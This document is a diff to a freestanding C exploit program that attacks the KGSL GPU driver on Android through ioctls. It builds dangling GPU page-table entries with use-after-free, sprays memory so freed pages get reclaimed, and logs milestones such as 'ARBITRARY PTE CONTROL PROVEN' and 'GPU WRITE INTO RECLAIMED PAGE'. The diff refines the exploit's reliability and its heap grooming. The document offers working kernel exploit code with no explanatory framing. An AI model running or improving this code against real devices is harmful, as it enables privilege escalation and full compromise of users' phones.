@@ -184,18 +184,7 @@ void _start(void){
     if(alloc_buf(0x1000,0,&g_cmdid,&g_cmd_gpu,&g_cmd)){out("[!] cmd\n");sys3(SYS_exit,1,0,0);return;}
     if(alloc_buf(0x1000,0,&g_outid,&g_out_gpu,&g_out)){out("[!] out\n");sys3(SYS_exit,1,0,0);return;}
     for(int i=0;i<64;i++) g_out[i]=0; dc_civac(g_out,256);
-    { u32 cid; u64 cgpu; u32*ccp;
-      if(alloc_buf(0x1000,0,&cid,&cgpu,&ccp)==0){
-          ccp[0x40]=0xDEADB003u; dc_civac(ccp,0x1000);
-          int pc=probe_mask(0,cgpu+0x100,0x3,0x3,300);
-          int pc2=probe_mask(1,cgpu+0x100,0x3,0x1,300);
-          out("[0] oracle low2=");outdec(pc);out(" low1=");outdec(pc2);out("\n");
-          struct kgsl_gpumem_free_id cf; cf.id=cid; cf.pad=0;
-          sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&cf);
-      }
-    }
-
-    int wins=0;
+        int wins=0;
     for(int round=1; round<=ROUNDS; round++){
         if(alloc_a()) break;
         g_h1=0x60000000ull + (u64)(round&0x1f)*0x10000ull;
@@ -234,8 +223,13 @@ void _start(void){
                     struct kgsl_gpumem_free_id f3; f3.id=g_aid; f3.pad=0;
                     long fr3=sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&f3);
                     out("[R");outdec(round);out("] destroy free_id rc=");outdec(fr3);out("\n");
+                    { int ac=probe_mask(0,surv+0x100,0xDEADBEEFu,0xFFFFFFFFu,400);
+                      out("[R");outdec(round);out("] dangling check=");outdec(ac);out("\n");
+                      if(ac!=1){ out("[R");outdec(round);out("] no dangling PTEs; skip\n"); continue; }
+                    }
                     int nr=0; int pteoff=-1;
-                    { s64 r0=sys6(SYS_mmap,0,0x200000,3,0x22,-1,0);
+                    { s64 r0=sys6(SYS_mmap,0,0x10000,3,0x22,-1,0);
+                      if(r0<=0){ sys3(SYS_sched_yield,0,0,0); r0=sys6(SYS_mmap,0,0x10000,3,0x22,-1,0); }
                       if(r0>0){
                           ((volatile u32*)r0)[0]=0x4D414700u;
                           ((volatile u32*)(r0+0x1000))[0]=0x4D414900u;
@@ -245,36 +239,19 @@ void _start(void){
                               out("[R");outdec(round);out("] first pte-like@");outdec(o*0x1000);out("=");outdec(c);out("\n");
                               if(c==1){ pteoff=o; break; }
                           }
-                      } else out("[R");outdec(round);out("] first region mmap failed\n");
+                      } else { out("[R");outdec(round);out("] first region mmap failed rc=");outhex((u64)r0);out("\n"); }
                     }
                     if(pteoff<0){
-                        { int ac=probe_mask(0,surv+0x100,0xDEADBEEFu,0xFFFFFFFFu,400);
-                          out("[R");outdec(round);out("] dangling check=");outdec(ac);out("\n");
-                          if(ac!=1){ out("[R");outdec(round);out("] flavor a (PTEs unmapped at destroy) - skip\n");
-                              for(int q=0;q<nr;q++) sys2(SYS_munmap,(s64)g_regs[q],0x200000);
-                              nr=0; continue; }
-                        }
-                        { u32 kid; u64 kgpu; u32*kcp;
-                          if(alloc_buf(ASZ,0,&kid,&kgpu,&kcp)==0){
-                              for(u64 q=0;q<ASZ/4;q++) kcp[q]=0xB6B6B6B6u; dc_civac(kcp,ASZ);
-                              int pk=probe_mask(1,surv+0x100,0xB6B6B6B6u,0xFFFFFFFFu,400);
-                              out("[R");outdec(round);out("] holder check=");outdec(pk);out(pk==1?"  (buddy LIFO works)\n":"  (stolen)\n");
-                              struct kgsl_gpumem_free_id kf; kf.id=kid; kf.pad=0;
-                              sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&kf);
-                          }
-                        }
-                        for(int w=0;w<4 && pteoff<0;w++){
+                                                for(int w=0;w<4 && pteoff<0;w++){
                             for(int q=0;q<256;q++){
-                                s64 r=sys6(SYS_mmap,0,0x200000,3,0x22,-1,0);
+                                s64 r=sys6(SYS_mmap,0,0x10000,3,0x22,-1,0);
                                 if(r<=0) break;
                                 ((volatile u32*)r)[0]=0x4D414700u+(u32)q;
                                 ((volatile u32*)(r+0x1000))[0]=0x4D414900u+(u32)q;
                                 if(nr<4096) g_regs[nr++]=(u64)r;
                             }
-                            for(int o=0;o<3;o++){
-                                int c=probe_mask(o,(u64)surv+(u64)o*0x1000,0x3,0x3,150);
-                                if(c==1){ pteoff=o; break; }
-                            }
+                            { int c=probe_mask(0,(u64)surv,0x3,0x3,150);
+                              if(c==1) pteoff=0; }
                             out("[R");outdec(round);out("] wave ");outdec(w);out(" regions=");outdec(nr);out(" pteoff=");outdec(pteoff);out("\n");
                         }
                     }
@@ -293,18 +270,9 @@ void _start(void){
                         if(hit>=0){ out(" page1=");outhex(hv);out("  <== ARBITRARY PTE CONTROL PROVEN\n"); break; }
                         else out("  (no effect)\n");
                     } else {
-                        out("[R");outdec(round);out("] no PTE page; KGSL-spray diagnostic\n");
-                        g_nb=0;
-                        for(int q=0;q<512;q++){ u32 id; u64 gpu; u32*cp;
-                            if(alloc_buf(ASZ,0,&id,&gpu,&cp)) break;
-                            for(u64 w2=0;w2<ASZ/4;w2++) cp[w2]=0xB6B6B6B6u; dc_civac(cp,ASZ);
-                            if(g_nb<MAXB){ g_bids[g_nb]=id; g_bgpu[g_nb]=gpu; g_bcpu[g_nb]=cp; g_nb++; }
-                        }
-                        int ra=probe(1,surv+0x100,0xB6B6B6B6u);
-                        out("[R");outdec(round);out("] KGSL reclaim probe=");outdec(ra);
-                        out(ra==1?"  (PTEs live; page taken by KGSL spray)\n":"  (PTEs gone or unreclaimed)\n");
+                        out("[R");outdec(round);out("] no PTE page (diagnostic skipped)\n");
                     }
-                    for(int q=0;q<nr;q++) sys2(SYS_munmap,(s64)g_regs[q],0x200000);
+                    for(int q=0;q<nr;q++) sys2(SYS_munmap,(s64)g_regs[q],0x10000);
                     for(int q=0;q<g_nb;q++){ struct kgsl_gpumem_free_id bf; bf.id=g_bids[q]; bf.pad=0; sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&bf); }
                     out("[R");outdec(round);out("] cleanup regions=");outdec(nr);out(" bufs=");outdec(g_nb);out("\n");
                     nr=0; g_nb=0;
@@ -314,8 +282,6 @@ void _start(void){
                 if(g_p_res>0){
                     u32*pm=(u32*)g_p_res;
                     for(u64 q=0;q<g_fsz/4;q++) pm[q]=0xA5A5A5A5u; dc_civac(pm,g_fsz);
-                    int sv=probe(0,(u64)g_p_res+0x100,0xA5A5A5A5u);
-                    out("[R");outdec(round);out("] survivor GPU probe=");outdec(sv);out(sv==0?"  <== SURVIVOR GPU MAPPING DESTROYED\n":"  (survivor mapping intact)\n");
                     sys2(SYS_munmap,(s64)g_p_res,g_fsz);
                     sys2(SYS_munmap,(s64)g_h1,0x1000);
                     struct kgsl_gpumem_free_id f4; f4.id=g_aid; f4.pad=0;
@@ -325,7 +291,8 @@ void _start(void){
                     if(dang==1){
                         out("[R");outdec(round);out("] DANGLING PTE + PAGES FREED - exploit attempt\n");
                         int nr2=0; int po2=-1;
-                        s64 r0=sys6(SYS_mmap,0,0x200000,3,0x22,-1,0);
+                        s64 r0=sys6(SYS_mmap,0,0x10000,3,0x22,-1,0);
+                        if(r0<=0){ sys3(SYS_sched_yield,0,0,0); r0=sys6(SYS_mmap,0,0x10000,3,0x22,-1,0); }
                         if(r0>0){
                             ((volatile u32*)r0)[0]=0x4D414700u;
                             ((volatile u32*)(r0+0x1000))[0]=0x4D414900u;
@@ -335,7 +302,7 @@ void _start(void){
                                 out("[R");outdec(round);out("] pte-like@");outdec(o*0x1000);out("=");outdec(c);out("\n");
                                 if(c==1){ po2=o; break; }
                             }
-                        } else out("[R");outdec(round);out("] first region mmap failed\n");
+                        } else { out("[R");outdec(round);out("] first region mmap failed rc=");outhex((u64)r0);out("\n"); }
                         if(po2>=0){
                             u64 base=(u64)g_p_res+(u64)po2*0x1000;
                             u32 pte0=read_dword(3,base,400);
@@ -367,7 +334,7 @@ void _start(void){
                                 out(found>=0?"  <== GPU WRITE INTO RECLAIMED PAGE\n":"\n");
                             } else out("\n");
                         }
-                        for(int q=0;q<nr2;q++) sys2(SYS_munmap,(s64)g_regs[q],0x200000);
+                        for(int q=0;q<nr2;q++) sys2(SYS_munmap,(s64)g_regs[q],0x10000);
                         for(int q=0;q<g_nb;q++){ struct kgsl_gpumem_free_id bf; bf.id=g_bids[q]; bf.pad=0; sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&bf); }
                         g_nb=0;
                         continue;
